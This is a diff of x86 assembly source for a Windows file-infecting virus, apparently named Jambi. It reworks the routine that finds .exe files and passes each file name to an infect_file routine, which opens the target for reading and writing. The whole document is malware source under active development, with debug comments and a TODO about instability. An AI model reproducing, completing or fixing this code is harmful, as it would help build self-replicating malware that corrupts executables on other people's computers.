@@ -127,24 +127,36 @@ find_first:
     ; Else save the handle (dd) in ebx // TODO: has to be changed, too unstable
     xor     ebx, ebx
     mov     ebx, eax ; store handle address
-    push    ebx
+    ;push    ebx
 
     ; save WIN32_FIND_DATAA in edx
-    xor     edx, edx
-    lea     edx, [ebp - 320]
+    ;xor     edx, edx
+    ;lea     edx, [ebp - 320]
+    ;mov     edx, [ebp - 320]
     ; DEBUG print first .exe found
     ;add     edx, 44
     ;invoke  StdOut, edx
     ;sub     edx, 44
 
+    ; infect found .exe file
+    push    edi
+    push    esi
+    sub     ebp, 276
+    mov     esi, ebp
+    mov     edi, ebx
+    cld
+    mov     ecx, 260
+    rep     movsb
+    add     ebp, 276
+    pop     esi
+    pop     edi
+
     ; restore ebp
     mov     esp, ebp
     pop     ebp
 
-    ; infect found .exe file
+    push    ebx
     call    infect_file
-
-
 
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -499,7 +511,7 @@ infect_file:
     ; infect found .exe file
 
     ; save pointer to WIN32_FIND_DATAA
-    push    edx
+    ;push    edx
 
     xor     eax, eax
     mov     eax, ebp ; EBP -> real address of delta offset
@@ -512,8 +524,10 @@ infect_file:
     push    esi ; DOS header
     call    ent_get_function_addr
 
+    push    ebp
+    mov     ebp, esp
     ; restore pointer to WIN32_FIND_DATAA
-    pop     edx
+    ;pop     edx
 
     ; open file
     push    00h ; no template handle
@@ -522,10 +536,8 @@ infect_file:
     push    00h
     push    00h
     push    0C0000000h ; flag GENERIC_WRITE | GENERIC_READ
-    add     edx, 44 ; change to cFileName's address in WIN32_FIND_DATAA struct
-    push    edx
+    push    [ebp + 8]
     call    eax
-    sub     edx, 44 ; restore address of WIN32_FIND_DATAA struct
 
     ; return if file couldn't be opened
     cmp     eax, -1 ; INVALID_HANDLE_VALUE
@@ -557,7 +569,7 @@ infect_file:
     ;pop     ebp
 
     end_infect_file:
-        retn
+        ret    8
 
 exit_success:
     ; WIN
@@ -591,7 +603,7 @@ _data:
    find_data ends
 
    ;win32_find_data find_data <?>
-   ;win32_find_data WIN32_FIND_DATA <0>
+   win32_find_data WIN32_FIND_DATA <0>
    ;FileHandleFind  dd ?
    filter          db "*.exe",0
    virusSize       equ jambi_end - start
